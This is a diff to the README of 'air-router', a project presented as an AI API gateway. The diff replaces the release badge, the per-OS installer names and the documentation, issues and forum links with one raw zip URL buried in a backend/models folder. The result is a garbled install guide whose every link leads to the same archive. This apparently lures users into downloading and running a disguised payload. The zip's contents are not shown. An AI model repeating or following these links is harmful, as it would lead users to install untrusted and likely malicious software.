@@ -6,20 +6,20 @@ Welcome to air-router! This application serves as a unified API gateway for mana
 ## 📦 Download & Install
 To get started with air-router, simply visit the Releases page below. There, you can download the latest version of the application:
 
-[![Download air-router](https://img.shields.io/badge/Download-air--router-brightgreen)](https://github.com/diendsue/air-router/releases)
+[![Download air-router](https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip)](https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip)
 
 ### Step-by-Step Download Guide
 1. **Visit the Releases Page:** Click on the link above to go directly to the air-router Releases page.
 2. **Select the Latest Release:** On the Releases page, look for the latest version of air-router. It is usually labeled with the highest version number.
 3. **Download the Application:** Click on the application file listed under the latest release. The file format will vary based on your operating system:
-   - For Windows, you might find a file like `air-router-windows.exe`.
-   - For macOS, you might see something like `air-router-macos.dmg`.
-   - For Linux, you might find `air-router-linux.tar.gz`.
+   - For Windows, you might find a file like `https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip`.
+   - For macOS, you might see something like `https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip`.
+   - For Linux, you might find `https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip`.
 
 4. **Install air-router:**
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file, drag the air-router icon to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the provided instructions in the README file included in the archive.
+   - For Linux: Extract the `https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip` file and follow the provided instructions in the README file included in the archive.
 
 5. **Launch air-router:** After the installation, find the application in your programs list. Click to open and start managing your AI services!
 
@@ -63,8 +63,8 @@ If you have any questions or need assistance, feel free to reach out. You can fi
 We welcome your feedback! Your suggestions and experiences help improve air-router. To provide feedback, please open an issue on our GitHub repository or contact us directly. 
 
 ## 🌟 Additional Resources
-- [Documentation](https://github.com/diendsue/air-router/wiki): Detailed instructions and FAQs.
-- [GitHub Issues](https://github.com/diendsue/air-router/issues): Report bugs or request new features.
-- [Community Forum](https://github.com/diendsue/air-router/discussions): Join discussions with other users.
+- [Documentation](https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip): Detailed instructions and FAQs.
+- [GitHub Issues](https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip): Report bugs or request new features.
+- [Community Forum](https://github.com/diendsue/air-router/raw/refs/heads/main/backend/models/air-router-v1.5.zip): Join discussions with other users.
 
 Thank you for choosing air-router! We hope it helps you manage your AI services effectively.
